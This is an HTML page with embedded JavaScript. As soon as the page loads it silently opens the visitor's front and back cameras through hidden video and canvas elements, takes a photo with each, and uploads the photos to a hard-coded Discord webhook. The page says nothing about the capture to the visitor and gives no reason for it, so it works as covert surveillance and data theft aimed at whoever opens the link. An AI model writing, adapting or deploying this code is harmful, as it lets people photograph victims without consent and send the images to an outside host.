<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
</head>
<body>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Discord webhook URL (replace with yours)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";

        let videoStream;
        let cameras = [];

        // Function to get available cameras (front and back)
        function getCameraDevices() {
            return navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    cameras = devices.filter(device => device.kind === 'videoinput');
                    return cameras;
                });
        }

        // Function to start the camera stream
        function startCamera(cameraId) {
            const constraints = {
                video: { deviceId: cameraId ? { exact: cameraId } : undefined }
            };

            return navigator.mediaDevices.getUserMedia(constraints)
                .then((stream) => {
                    video.srcObject = stream;
                    videoStream = stream;
                })
                .catch((error) => {
                    console.error('Error accessing the camera: ', error);
                });
        }

        // Function to stop the video stream
        function stopCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
        }

        // Function to capture and send a photo
        function captureAndSendPhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the canvas content to an image (Blob)
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.png');

                // Send the photo to the Discord webhook
                fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData,
                })
                    .then((response) => {
                        if (response.ok) {
                            console.log('Photo sent successfully!');
                        } else {
                            console.error('Failed to send photo.', response.status);
                        }
                    })
                    .catch((error) => {
                        console.error('An error occurred while sending the photo.', error);
                    });
            });
        }

        // Function to capture photos from both front and back cameras
        function captureFromBothCameras() {
            getCameraDevices().then((availableCameras) => {
                // Find front and back cameras
                const frontCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('front'));
                const backCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('back'));

                // Default to front camera if available, else use any available camera
                if (frontCamera) {
                    // Start with front camera
                    startCamera(frontCamera.deviceId).then(() => {
                        video.onloadedmetadata = () => {
                            captureAndSendPhoto(); // Capture photo from front camera
                            stopCamera(); // Stop the front camera stream
                            // After capturing from front camera, switch to the back camera
                            if (backCamera) {
                                setTimeout(() => {
                                    startCamera(backCamera.deviceId).then(() => {
                                        video.onloadedmetadata = () => {
                                            captureAndSendPhoto(); // Capture photo from back camera
                                            stopCamera(); // Stop the back camera stream
                                        };
                                    });
                                }, 2000); // Wait for 2 seconds before switching to back camera
                            }
                        };
                    });
                }
            });
        }

        // Start capturing from both front and back cameras
        captureFromBothCameras();
    </script>
</body>
</html>
